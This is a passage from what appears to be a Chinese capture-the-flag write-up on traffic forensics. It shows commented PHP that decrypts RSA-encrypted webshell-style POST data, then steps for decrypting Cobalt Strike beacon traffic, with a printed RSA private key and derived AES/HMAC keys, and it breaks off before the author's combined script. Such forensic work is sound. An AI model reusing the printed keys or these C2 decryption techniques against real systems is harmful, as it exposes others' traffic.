</span></span><span class=line><span class=cl><span class=c1>//$_POST[&#34;l6eca85c56d82c&#34;] = [&#39;Zn4Zj/XIusIg6hgVKeAyHg5YkY0aHpA+sClHd8bYyJwJQWeTKg9O0rWjx4uyNAp3lDxcubak981Mj4z7pGLLMcARQVssILHX6HGKnJoWkB6cNCbfbwI8YqUC1NgEsj5iQtfdIDRCmaczzw6/m+tlohMFoQSrN8SASUQ5FrURdq8=&#39;, &#39;ScFasYUe1rnzXnGAXtEEQ1HY5nhBfdQ2DCBkSMc0/UvE1Pw6Gyhlbe9B8m9Sq7H1QXMeFEQw7C/MHVIUFfKwFCEaIeScKV0uwDZAQ6aPPaVlx00zWnp1RLvv4fvh9qMt32NEVK6pH4l+tTSUtGTbjKNM3AHJIPigWgJdxiyIn+8=&#39;, &#39;OGIDiLqt55rKrqDCWBal9irWhxdFoTcR/yBdMpuHY6KwQqg40zQb6wLJ7KvMZSWJfI4EcMIchta0oLIaxUy0Mtn6MvUVIo1Kg2OoFyAS2DPlt/2vwN8lSMDmfWSdyv+oAGyE2H068KoB8kX35Wn+LEF2IEMDaOzx2azojkXycXU=&#39;, &#39;AQMG1moPhYMGh04jYOhrxI389fD7Er+8lkP+xa4yLZyQk6Zp2DgI/2Mzt9sDRvVRrDm80dzx16o2zNkRiKRAJrK1RQuMl4wuFph5meAoCt+aDe6ct4iX3DHkEveAVikjvIhYg4hQMMwYFZ7t+uP5wtdLs8f2mBCaDqhOCq7OIlY=&#39;, &#39;Mriexd4PpivbbGf3p4ALnXtkLufDDcDjQL/y/XLJcwTEsebSlUrSvCR59KZOD+PqVxYY5gxfYPGzoIqCrIsEsMye7OxIAFFn2489rfHzRai3xKJKG5Bj19HnMgX1BPyrypDbKkleEDlkYCYHgE9nH/4CFPXQr362Kxp5TeiMhd4=&#39;, &#39;Js7EXmASNJv7vhWlQOjg2c1fypN/R+U/o8xXOY8/SVCmUuz7QRqcc52Qxof3SFD2XxzSRTqnHZdIE27tp5jV2UGHi5Z2jc+gj8UmqTE8VuP6X6FOhUqGC96prfxmbSCMkA/e8mtJsJXiGhjHkRvULnBoTzRlf7/PQaGmnmoKEzs=&#39;, &#39;D3AolWpp3tEoJI+zfdYBfonRED1vlE5qh6sJug+wCk9r7PQex1dsFHzMb57+ogMFaXk3Gz7fBnr06PWca6xYzdPHHdVCNO2p1P60sFRS7mvLRs+CBotiEGd9U4ChDQ5yLPO96sSWOo5iVU3rZPeOdNUZW3yyaNZ8r/IynfPMsZQ=&#39;, &#39;mTW7v54Iy44qnOyJeXu/oCFVaKOBj06eLi5zxPpe073AO1jn5nwMBR0UK7Xa/bG5NlBfplS3Y3Ll1ya2mvOe+4LIRKgMOXRGejdMb2S93IbCXPqp7XVNrqcrXr95SkJeeEk+zktgD16/WpixUCgs0GFYmGAKSeGaYmdaQ+sDKmk=&#39;, &#39;SUwTv5sLFChoUtykcBW1sqi/4Len4YEYM+3VpNR1xbfHHSThR2jjK0TeXPBk9vLVzuWPIpg7ZRAQgoi+OoOeDjoEzmYMw0nuaZvjw6GKZrH+UQlFBZuVZ248ZdvqH1zQCX3tTWM7NxGnPKNqD7JEjS+ixsCGk5Ea7gb88yI1Fz0=&#39;, &#39;FNwwTLPWXutIJwqnDwgluIv/Ies/71C8H+UUuG9KuULzXiZYNlbOSfAZu0hT+YD6B2cVN3nA4l5B3zDYU13UiQh9LewNC8KUnBlOPqhZPC57iiXJBETg+FDo9UZswN7JkM6FaZp1osmCtBtP+uPbs9op/nACWTqRDlc3AzmzhC0=&#39;, &#39;g/cOJmEmrg1046z5unyLSfag901Dwbiog/06TTgBzbZCxBYzqNMiLpj3q9WzzrzfZpv8Y1sPSwAhbW+6ux7+bH6d+QbgfJK5I5Fxsd/9yweOa04JhWieCRizU8uMm3oWt2ZrvdThgyO0gymm7UTIqeMz8jEnUDh3E7rGI3PcLyI=&#39;, &#39;DCAfid4xuUbZvB52YRqDOJ1eZ9oxZOWjUgT5MgDZ8ATlt1kfGrRF8xfu99takkdl0pS52cxzUylyotJFDD2XZ+yDJIM3T9eojj0/o1J1umNxa8oW/rGtzp+dMnGiofpjaaHxxfjwDztbglYPvC4MtsxMxm5EIVqvuWAXDbniCt8=&#39;, &#39;PtgveYLNMoPTJbdMLIMUfcKG5xHEuH+0woXkCO8vF25EEH9Kt/TT2M6sIEYvhKJX+geysxkOFMjDEucKQeEPV3E2Xtkzu57QR4yLDnzq07qmYYqBsAXZD9Thon16axBvQdwJ2R21BKEIvfucBKE7lR4DL5idxXCQMZseRh/dFNE=&#39;, &#39;R4Te1rFFngYZVODMcwZ8foyk+U0A2Rs6AhwXKI4duiECWGcZhbDKyHkOstfggZceBlMdLDO7zw1C5HqMFWkvDOqawLZL8kl+XGnGoRKZaqZut27l3fB20eW+X/2jk3tgS5XDMkmiTjWfJ0Fns+bpoDZULXO3USMSnrsPy/zeosM=&#39;, &#39;QhGblZx2qZpBWU1WNGSb4In1lIEydg4qOKTIDgdSx3jS4YOfV58sgOHcaOzoZK9vEqsKbqjJl+MGShmilwuwZFkolnb73hKAR74RXodHEUonGJcZMpWxanvhe8AqjBUmt2AtIQ/l9fu39l79djKnbw2v5OoBMMSHRomf9iCIgJg=&#39;, &#39;RsBFWXfFGbe6QNPs+Bjb2vgWKS1cQ1hCQdnjbfMWXRIlln/z9LNz8TWw1OTY0le8pSKil15yyWVHWu8Z6AgwgGcw/fhHy2JN4m/LsnAtWUR4ae/CLeZxCGs2PMJTI72qAUkhQY22g/4P8pKZN9UuzS9J7o1AmTuBGIULYNOpOrA=&#39;];
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>//$_POST[&#34;u51aea36fa19a7&#34;] = [&#39;QsXJKJ+HbslLx5m2I3NOeM4bW62m7LWOrDehaEf6XfBjIvU03I5qrX3DPPiIXlovgL85iuAf5Z8vauDIY+tCrNQxaefDg0UuhEVubSB/smQWDfFgbRfKRyF93GFCT2jEkhTO0rH0ohzTCYmMcQh+2Sndhf717fUCzbyI8xmHk2eHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#39;, &#39;lkg5ELvolihY/qU7jRsjXoFqK2eh/6Q/bM/s0L7cAZ9Nz7/99SKe7ez1uCQIaWdEtYrPYaWM0F5JqX/g9S0d8AZlUgg2LmwDJHwR8NLA5LMwohwsaYuIVJ/ojS0c8K1b+qbnrIPO5bzy3VnVaM4kHdmDrEF5FvSbzEx2PmxJSuI=&#39;, &#39;njtBworWRl9RQtpVKnNbefSnJdWWSmTPMnSSVBHSCgRTglKsCKF+jeqlhLy1O7Yda/H5hMF6OGMjn+x+bAHVYViWOwPBWRdNZbp8KteJvPfx+8K+X3BpmjmpsrgvS8f9PipgoCaQ5uGCt2MFTHidQ/Dl22Fv+EY54IZpkzv6qMqHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#39;, &#39;LhpEKqCGqIVO3UeoJMKOAld0Je185OIx3yxB277muqA2UIURtPGeskBh7ks2O4Yka1XK3kI/DBs8tNAbRXmDgDov7VhtdH1blRdd5qEnmzzyOQNGEnuDkTPxvmwTWmHGcX4HV4jJ5YkF/6l7t9N6WmV7jjVcnw8iJFhfPlrPEmQ=&#39;, &#39;bAV20O86Mjx9jAR+1oTaFUokJgb8WwgG0kcuFomp3Z3oB2PhzdBmPnqgAsczLbw0MgjlomXcswh1ppWX+UTZu1HEriKJ485h7uUSwralQ7AIpuHz0Te7EBk93rB6K9e5z2cVtr9AFS39iGBnGZz6POEfeUPBxr+KPmffIty3+pQ=&#39;, &#39;OBlv9+3FmnsXIHz0e0SO5FSUyb5Vzk/lsszyuqgxI3LnyNyQJBLeUYJ6Z/Y+mgPkPVTS3XXbl7dw9r96ise1P0oxQ1OpF3CduihESGhv8hsjsGtyodDVoOXX/IqafSG6A5+RrrSE2QXSu1jR82eaKqz8tirqeDGjxvxQcP8hCHY=&#39;, &#39;NP80SyrmGiIns4eM5g+ZxmKrDZeLZ+Po50XYvL6jfnaKUmguyL4zyhmMP2pUc/lJKjAzNBwAuu8nzr59weMtfwWCnxxW+odCniTloqtgjNz4XMfmFMQt9JyXimR7MmAZLslAAVQ3BqZi+o5yAZolhhdWZFZID4eFeWUt90mH6foo3Kwv7cpKoucidOB4WmC+cgQr8J4wV+90ucZMShIACSDWIwzQkWf5ipKYX3TDPpxdx6mB/myr+qSKvJ6cIMj2+C2JcNeMugLFwPcz8FdYAeTNfS99HR2/s2wORcWPvjLgo81GJmY9hEynw0TiN6FsUfTTSXZZQrgawL3hVJihIQ==&#39;, &#39;liznpAZwDr08AvagvCka74dg8JEmt11DJA0gqntiVYfGiJXTXDDcwoEFAQjEtilhu/HriqBhs+9MnHHehKNC7dqycC9Zee9QD1Dc3bVHNw+qE8Xo47591rD2V4HieLMyVLPkS226cr2EEjcohq49czicdNuxS1174fJFVT5KaKYqzY8ePpqnDtVgQpOw2COA7Oynj8TMoDBjRdqj15Bi84zw2ccg6Co0MdfCSBKpNx2aXAU9W/3HTQK2o8NbYx0mX1iVQ2rKnUXfGcIzDDI+lQFIelJ5IGBpiCZWhx2otRYOR89UkpGXQ34Om34s4iLtw/X8AMXkO+opsVEzOPJchQ==&#39;, &#39;kYmwYioUXSEJdbQGaZNF2F8hELzyhWJt7pTcT0xrMd6wLmD/nKvZTUztFzbvH4ESRmmC+QsncW+vw4hTflc0DkO9g9PCiCp7GjS8aEpIT/9IivgMatu1gQmkQSLiJHSc1Krhgd03LWbHax23GjcXn1Wl8I5DKXeLAst4bx7WWr6HZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#39;, &#39;m4CmQPu0sxKIydnnGtkWSfc34mLRJj+Rh7+8nWU2ZF8T2E1u2yBt/JDaSjM+Upa52PjbxQYZ0/V+SnRv3qmARNOpH5Snqjm60YYlMbNH7ajDeojHAMVe7YqQ3gdFThdqEQq1qKBxPfVDPodlbvRDKvy272MxDEPl6hntE+cQedU=&#39;, &#39;SpdmQo8YK6Iag/3iNakttTCsmjdZN+VU9AakLngsk00A9jL6e5zyjPF5ePQpXrXxy2ZjSXLfS5J9t7xatfP6Rqjsl/7UQU+jrfgLE9fejXv0mOSDjZuu+4Qaw8eLX0QIbohjkI6eyTHcKBDITcEt2oe6vBG4re29lCopCaXOo+RXtS3zvuPe3777naWT4eyOkZV2dNROvyUlPdUky5ElfEo9qkqr9nQ9UJqOPfRQFw0HV+WkoY6lWCewG8O1kb08iULwTsaiLwq0WFq5gnF0GR1GjhbTDuqPxA0ad97Rkf2U/GVkGlyozThVYOlmsOiWbl73Lq1AUX2MDvN8JIMBDIPAxtO0It5WqDzr1Lmbn6IwxsUtkm9OVkibNNWDnsYu/ZooBtPaeWiR6orGpORfHgWGAJtZJbxFpgecvlwpyET04/co0wwJsleK9h6DQNI786xi9GKHhzkOs9JzeBwO6bPjgGQhhAY+YqOr+A68x7YINw2UOr7f3VaiWP5hWZQlG0X5yVhMVPiYvvcvYBF7/ZafdeifZYG2vYJmtD2kZ9wlTnwFXujUeqMGVHtIIE4RBpAN1nTVxaPlCpDLR7cZBCcWbeEbVgoUco2dFUuq6JUP/lVCRQu/O6A5hlrqYbNP/ZHErvn8V4/oymBeF7BngUkDnPcKL7ueoRVBC2WoYgyVVCy5A4de/gQwBR6qTJi7mCPHr/bA6JWeJDt3iG4y6AY4QcW9/vBrdC39uLgxo2reVljQZ/riC3la70g5DnGTHd/mdo5VYN6PhwHLtya7H1fAlS37/+ybggDyECtO9/RogvrLuI4QWdEFh3aZkavAiYXFdqOfB4tdxgRZCyninwmtSq0Zuylv8O3K0ZZCm1r8fpUhOM/5u5ti8xew2d+RM57rdaXvNSyoqg404M6adNfG6+cyaoHJBGzr4ET6fdO7dkgUt8rsdgW6JztH6epw4XxZ+fiw+jGL5RxXg0xHD9WLNnh02cwWo2FSTPLgowwFvfwGDHjMH/HtgJKROjknhNRrDAW+Uz/RXWkZJoIj1ypbSIhWjVCBsHwc5McpUnfK/iL8wudMkIztSBS9Z9n2SRAIOwgalrnOMuVeS5dNd8WmHzDOC3pQ2rZ/vjy18UIYJkVzxrPw79GHmjSlUWouSs3tQwlQ5WhkK2lGl8vTBLDNJA7R2/O5b2MEz7BDnNA=&#39;, &#39;ZiKfh/mdWXeAMBngvBKOGSXMnHdMjBt774kcjbn1cXl6l32kZi6Bv3949cEjAy4PQwQJWlTxmMT+JD0aZ4mkZN9S5lhNZIg1T29KxU/oryNonP0aVoTsYvqgiqjoaPZ6tRzjnNSujojyelHISea7W9ZgFdqHOn3X4/SMNYjo0u0=&#39;, &#39;BLHRbtBoY+9jjKwUn3g/6VjqpEGtzEorD2bcNsSnGNTh365TacqwN6vG0ONzTjdHkdd8YhhtPvFsLDAj9Tkn3XRHzCEVFf6oao2xivHpDC0w5e1RniXFpl5DlA2R+XfyxxN0oDHgdtemCCwotSX9/D6TX28nFvmpVPxoX7IBtV5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==&#39;, &#39;nD0ETT7Mzl7+XF5kZhI0pIuONkncH5dNPVGzS5jaAS2Pcpva/SdCkCaRkg4C9s2uZrBEkWWFWM/7gx/tlmJYHM/6cwIlbk9PLJAVcUrw6Ecgx6hiEbP4dWcKg2VSzwacsyozCGeMeZV3LQCGRTfi6ewm/QpW+mujiQH38sj4/N5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==&#39;, &#39;PDMzPKDsBdh0LHO+RJn7G+bShEVxn5hwPb5RfzwLjZIhvHQdWat+S34q+e8G9yfJWrTYg8StP9AjDGyLK/TcWtI6eY+VRGUvUJ4fGMoT09sS6zILqDInOzHrhEHin4IgkowJoF3TFX2KukR38LZgKn5VKi9F7Ue0l2hqeO0IRq8c69F5II1xspprr2YGy3hU9nO38KTUD/4kPbuu8rsit4/BSdJdWv4+xIjEcS11SzTMWemzVGMv/Ax/NiZGtJFCaW3XB0w0M1XWXG8ewGmpj/8u+VzPoDXhWCrYRvsw5mZdQ5FFmHHCU5mtMsI3mGNjnmUnD5IXbV6TfcQmlPrs0w==&#39;, &#39;lTtqYzsk9q59ReMvJUcP5fKUYoxfZQS9QmOyjqbBvy/9wAX16xpnqmhUlwHIDNAlz9nIZPCJHjV66Ey/S7px2UW+921Lm1a2YocFcTkDS7zqNqDaoS0cpigSTB4skhRR7pAe43n3CCbvRlF6sI/uOZxUnfg2nXHkhAyDGJsCxgQ=&#39;];
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>//$_POST[&#34;y21db7ea65d36d&#34;] = [&#39;ZqGizxiHeHVBCCyvo46huPPtI7TBLmoEQP/GX9AGPW1ewqeV+9/LeJVWT1o0ALkFCVj1DDfutzXfrIQdpVh+HBoVUiGjjG8sSRiEPfRJmzAzVxR+9nnwrF4EObavmAA3Hh/0TBtirl+9iUEU8bN5TrnV6Gq5y2RbYeE3Mri2K/0=&#39;, &#39;b46b/qgtImXh6TF3gxU2HZHjmKbjhV5WXV5d1wqTANk6v7RKgR/Tq/IzYnIGwduVwwX2mf/kXl2OwqEwmhaqc2xoUK0EytOYe8y+tw+oE8C1AGMVEPVEH/LM77s4iU81SQqr5nPHQjSprv8UQR0tIUfB42JgSuw82SxoR8T3Nc0=&#39;, &#39;g8K2XGqaUSdc2og56FbCAgHsAdlcxQajw7hJ5cUOe2ix93yk8MhwnWvAkHcXy/PQG9Da9ScixBzJFw/dnINflq4yLkp8N/07JSZgg7DPLz/o1se4+yMv6H+IP2cD0Q1UU2n4PAEbCtAA60m0kczWz/fE81DbVj6JxgWl+EmElOI=&#39;, &#39;Wjero64jDdIPWXLGz1rrNCfjcjJhJlH2NmUIT8WK7thISuS/Bm7RnnFyIC4jnkhuX4ZTtsY3IWuAO41R2JfBcZi5fZlPDLdDn5ojOmm5CRcHacCFy7KTmDtYtSsjD5vzBaKrMfF2tRN8bnd8CT91V6rg40ff2+9HvHjH7BBhXUI=&#39;, &#39;aG30z0UroESpnX1CNbp2HS4DrVWrtqOWs1Jpw5ONcWdr64bkB05DdNHpW5Nqh9xVvlJTuVXWyrPc4V12GwmuN4ifN8TtHCq1n4/TnY/BerzzYaXrp89iXXkXmwRUFEqJ+iOVNjAzfdTdnRPaMPtRUFQjugF0U+3AYa9SrnsLrLk=&#39;, &#39;QCXq2VxN88Rey14xm35TsRqAj1cbIgKma0PxY2qrJ6DRD8D6JhT0CbF37pQDUyFU1iuBhR/h4tVd/k8PCBRoKOPF2R/1jDol3EQAWLSYZUd8mOCY72XD2wnnltTTHqB26N5nbm6qaGx5fi0PWH++Ds0mrCiJsE2+fMFIXDGCXag=&#39;, &#39;kqNJjIRlbVMlD8E5yPJmYBzTNKxSVpKARQOeA2K9SCUeMZEARoaru3aL91Qefzo/fhWCWEwieXyeBZdjE8c1dY73u7D/jneXW68krQXndzrNwFTDQRyiOvZJRREQ7ZNOyDmB7ltpLv+mizWTv/bQezF7sbIh4KswbjXuCj8w0NE=&#39;, &#39;BvzvMn7WAaWgqdlyMbUzEzgRDr3PFNgwIClZ3C7JTMMTqhErpNgvrLxHVoNelTJsj9y1VatUKGRir9qs67L++SYMICBLTiu3ZctGtdmsxufbTMYfWr8EbiiDd0bYhPvYbzlHU1MlI+fpEUUrGckC5caeVcHaqNB7tdhDJvFms4E=&#39;, &#39;ecC2GvhvXqIFNVLx8g1YPX+VeUOiFKLDHik8NnmrCbPQFtduUwvhiMT2joMHhr5f5fOVi/jpwrlC2yR2jhPDtmIl8nkJqnTd+uBykNguN5moHixbKWMMv8HYejnT7CLGmTxLDzTrQlICua+4O31jOOmDrrLuUdLKI2uaQ1FUAMc=&#39;, &#39;Hg8A03izTr7zhommneQYE2d9UO+EpWtU3Q9rYM3YnJf7SkVcw9+NHKno7COU1NVbXiHJjV2bTDcVnAkQeJJqZGXNJfR3kSo3XYlwXZGWatrccd/ADyu7E+Bt4oXtp4pDpafhDJLh40cd6jprQnIYxDYBcs4o6CJjvR7JpOLmC0A=&#39;, &#39;YsLUw+DPF6JpxvD0B8blORoPd3xe6y4P0gYWlHgRwnlCRjyS3LlKRbY2lqrtulh/MRz0yGOSYjifa0c4sbqsbIf+ENFXmiqqm3ySPjXWl4z2wdrZMEV4ZXp6VXTxNk6cizDoONBDXXuTziZDB+DAev3+6HHtaI5tspkMVap2ou4=&#39;, &#39;GyS1qCDux10wqJhGI7tKn4MTwRiRhAMoN3/DpO2ehtOkp/G0tS1Dhi8tdpWU6OqqtxPs/6G/GqEoC1PU2StQzal0QO06pAXixlMvx1lkHmAOAj7GI5vWnETeyrTUBkGwdRki3+VlvU1eUOVhJLg046EMaJsy5z4Zz7Xn++d1BsM=&#39;, &#39;KY2kr0R6yNTgxw40gZEZKGfZslgQEEEOqRADN2skaB+hdfniw7t/eV7YrDbJfkzaPo+oUGbebR4IRPcWgeIYJjtte9h/y/ugcFu2SmZ6PEIp35gin1LKqWehNA9gnXeRVP/zpAD7kmVK5PMfWU32V7lvp6Dn00KdpH5CPHWcQO8=&#39;, &#39;IRX0gA23Zu3I8rlcswv+iqJIfs3Kf5jKmiq3FrB0Zcs2N7VfZE7y3qy7/T2OAC98KrO874t0tOLDxhBw6hDz6zKRINRjZLy4cQC1MhUWJG0lqX2cI25ePHfmPUpFnRUzZBBkuP7TqFO+PzJiLA8V9cxe7uWpt2dw/cC11r+k29Y=&#39;, &#39;MmCqLxv78f+GCRBM16oPUgQCiSn6yB9O0UuVILu/e0ISAWsXvInQT+VqU3dORntNyV5+VSbrn7u0in1c4PJHz5oH0wVcdwVbeH+K6CLOVF43Pi1HkWiKREECpLKO8ClDkDLeAbZ5SVgSjVuUqVT5f4TOKKSB/EZVnWlIE1PJrH4=&#39;, &#39;gyfTIHW5Ov921U8HQ/3qENdIwwMoBm8JJ0KI1XoLBNDDEYLKX8+EGNlNZikwBCOPNiP8FYftgUTQzS5DokJzDm4TG89k49i1In8Oeekdb1phbZkUWpboWv9+VPTEc5VH+wCM/l8FA0wvZsm/iqfwe6grn3C6PUNP+AOo0QcywKw=&#39;];
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//$length = count($_POST[array_key_first($_POST)]);  // 获取任意一个子数组的长度
</span></span></span><span class=line><span class=cl><span class=c1>//echo $length; // 16
</span></span></span><span class=line><span class=cl><span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1>//for ($i = 0; $i &lt; $length; $i++) {
</span></span></span><span class=line><span class=cl><span class=c1>//    $res = &#34;&#34;;
</span></span></span><span class=line><span class=cl><span class=c1>//    openssl_public_decrypt(base64_decode($_POST[&#34;l6eca85c56d82c&#34;][$i]), $de, $pk);
</span></span></span><span class=line><span class=cl><span class=c1>//    $res .= base64_decode(substr($de, 2)) . &#34; &#34;;
</span></span></span><span class=line><span class=cl><span class=c1>//    openssl_public_decrypt(base64_decode($_POST[&#34;u51aea36fa19a7&#34;][$i]), $de, $pk);
</span></span></span><span class=line><span class=cl><span class=c1>//    $res .= base64_decode(substr($de, 2)) . &#34; &#34;;
</span></span></span><span class=line><span class=cl><span class=c1>//    openssl_public_decrypt(base64_decode($_POST[&#34;y21db7ea65d36d&#34;][$i]), $de, $pk);
</span></span></span><span class=line><span class=cl><span class=c1>//    $res .= base64_decode(substr($de, 2));
</span></span></span><span class=line><span class=cl><span class=c1>//    echo $res . &#34;\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1>//}
</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=cobalstrike流量分析><span>CobalStrike流量分析</span>
<a href=#cobalstrike%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>参考链接：https://5ime.cn/cobaltstrike-decrypt.html</p></blockquote><h4 class=heading-element id=密钥对文件的情况><span>密钥对文件的情况</span>
<a href=#%e5%af%86%e9%92%a5%e5%af%b9%e6%96%87%e4%bb%b6%e7%9a%84%e6%83%85%e5%86%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>先从流量包中导出key文件</p><p>然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r
</span></span><span class=line><span class=cl>To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh
</span></span><span class=line><span class=cl>Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC
</span></span><span class=line><span class=cl>gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
</span></span><span class=line><span class=cl>r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW
</span></span><span class=line><span class=cl>vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
</span></span><span class=line><span class=cl>3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp
</span></span><span class=line><span class=cl>v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
</span></span><span class=line><span class=cl>9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
</span></span><span class=line><span class=cl>dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
</span></span><span class=line><span class=cl>AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
</span></span><span class=line><span class=cl>ddsyNI6XbCU=
</span></span><span class=line><span class=cl>-----END PRIVATE KEY-----</span></span></code></pre></td></tr></table></div></div><p>在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie</p><p>运行即可得到 AES和HMAC key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>AES key:ef08974c0b06bd5127e04ceffe12597b
</span></span><span class=line><span class=cl>HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9</span></span></code></pre></td></tr></table></div></div><p>然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中</p><p>把流量包中的POST数据包中的data的值用CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中</p><p>一个个解密每个POST数据包中的data即可得到flag</p><p>我把上面的步骤整合成了下面一个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
